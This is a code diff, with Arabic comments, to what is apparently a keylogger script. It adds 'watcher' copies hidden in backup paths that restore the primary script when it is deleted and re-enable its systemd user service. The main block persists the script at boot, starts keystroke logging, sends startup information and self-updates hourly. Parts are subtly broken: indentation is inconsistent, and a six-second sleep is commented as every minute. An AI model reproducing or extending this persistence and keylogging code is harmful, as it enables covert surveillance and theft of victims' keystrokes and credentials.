@@ -23,6 +23,7 @@ import subprocess
 import shutil
 import sys
 
+is_watcher = "--watcher" in sys.argv
 
 # ===== إعدادات البريد =====
 EMAIL_ADDRESS = "default_email"
@@ -283,6 +284,34 @@ WantedBy=default.target
                     print(f"[+] Script copied to: {target_file}")
             except Exception as e:
                 print(f"[-] Error copying to {path}: {e}")
+
+    
+    #  ( حراس ) إطلاق النسخ الاحتياطية كمراقبين فقط
+        def launch_backup_watchers(hidden_paths):
+            for path in hidden_paths:
+                target = os.path.join(path, os.path.basename(__file__))
+                if os.path.isfile(target):
+                    subprocess.Popen(["/usr/bin/python3", target, "--watcher"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        def watch_primary_script():
+            while True:
+                if not os.path.isfile(script_path):
+                    print("[!] Primary script missing. Promoting self to primary...")
+                    try:
+                # نسخ نفسه إلى مكان السكربت الأصلي
+                        shutil.copy2(__file__, script_path)
+
+                # إعادة تفعيل الخدمة
+                        subprocess.run(["systemctl", "--user", "enable", service_name])
+                        subprocess.run(["systemctl", "--user", "start", service_name])
+                        print("[+] Recovery completed by watcher.")
+
+                        break  # توقف بعد النجاح
+                    except Exception as e:
+                        print(f"[-] Recovery failed: {e}")
+
+                time.sleep(6)  # راقب كل دقيقة
+
                 
 
     elif system == "Windows":
@@ -338,8 +367,24 @@ def run_every_hour():
 
 # ===== تشغيل السكربت =====
 if __name__ == "__main__":
-    threading.Thread(target=start_logger, daemon=True).start()  # بدء اللوجر
-    send_startup_info()  # إرسال إشعار عند تشغيل النظام
-    update_script()  # تحديث السكربت في البداية
-    persist_script(os.path.basename(__file__))  # حفظ السكربت ليعمل تلقائيًا عند بدء النظام
-    run_every_hour()  # تحديث السكربت كل ساعة
+    if is_watcher:
+        print("[*] Running in watcher mode...")
+        watch_primary_script()
+    else:
+        print("[*] Running as primary script...")
+
+        # 1. تثبيت السكربت كخدمة تعمل عند الإقلاع
+        persist_script(os.path.basename(__file__))
+
+
+        # 3. بدء تسجيل المفاتيح في الخلفية
+        threading.Thread(target=start_logger, daemon=True).start()
+
+        # 4. إرسال معلومات التشغيل
+        send_startup_info()
+
+        # 5. تحديث السكربت عند البداية
+        update_script()
+
+        # 6. تحديث السكربت كل ساعة بشكل مستمر
+        run_every_hour()
